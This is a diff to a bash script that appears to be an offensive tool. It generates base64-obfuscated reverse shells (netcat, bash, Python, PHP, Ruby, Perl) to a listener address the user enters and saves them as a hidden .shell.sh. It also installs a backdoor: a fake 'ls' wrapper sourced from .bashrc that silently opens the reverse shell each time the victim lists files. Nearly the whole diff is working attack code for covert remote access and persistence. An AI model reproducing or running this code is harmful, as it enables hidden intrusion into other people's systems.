@@ -22,20 +22,24 @@ payloads=(
 
 )
 
+function encshell(){
+		echo -e "Enter listener server address and port\n"
+		read -r -p "Address: " address
+		read -r -p "Port: " port
+		shell="${shell/'address'/$address}"
+		shell="${shell/'prt'/$port}"
+		encode=$(echo $shell | base64)
+}
+
 function genpayload(){
-		function encshell(){
-				echo -e "Enter listener server address and port\n"
-				read -r -p "Address: " address
-				read -r -p "Port: " port
-				shell="${shell/'address'/$address}"
-				shell="${shell/'prt'/$port}"
-				encode=$(echo $shell | base64)
-				echo "nohup echo \"${encode}\" | base64 -d | bash &" > .shell.sh
+		
+		function create(){
+				encshell
+				echo "nohup echo \"${encode}\" | base64 -d | bash" > .shell.sh
 				chmod +x .shell.sh
 				echo -e "Payload saved as `pwd`/.shell.sh"
 				read -p "Press enter to continue "
 		}
-
 
 		PS3="Select Reverse Shell payload: "
 		options=("Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell" "Return to main menu")
@@ -45,28 +49,28 @@ function genpayload(){
 			case $opt in
 				"Reverse Netcat Shell")
 					shell=${payloads[0]}
-					encshell
+					create
 					;;
 				"Reverse Bash Shell")
 					shell=${payloads[1]}
-					encshell
+					create
 					;;
 				"Reverse Python Shell")
 					shell=${payloads[2]}
-					encshell
+					create
 					;;
 				"Reverse PHP Shell")
 					shell=${payloads[3]}
-					encshell
+					create
 					sed s/&//g shell.sh
 					;;
 				"Reverse Ruby Shell")
 					shell=${payloads[4]}
-					encshell
+					create
 					;;
 				"Reverse Perl Shell")
 					shell=${payloads[5]}
-					encshell
+					create
 					;;
 				"Return to main menu")
 					return 1
@@ -86,12 +90,7 @@ function lswrap(){
 		case $bs in
 			[CONTINUEcontinue]* )
 					shell=${payloads[0]}
-					echo -e "Enter listener server address and port\n"
-					read -r -p "Address: " address
-					read -r -p "Port: " port
-					shell="${shell/'address'/$address}"
-					shell="${shell/'prt'/$port}"
-					encode=$(echo $shell | base64)
+					encshell
 					echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
 					echo "source ~/.ls" >> .bashrc
 					echo -e "\nls wrapper added!\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal"
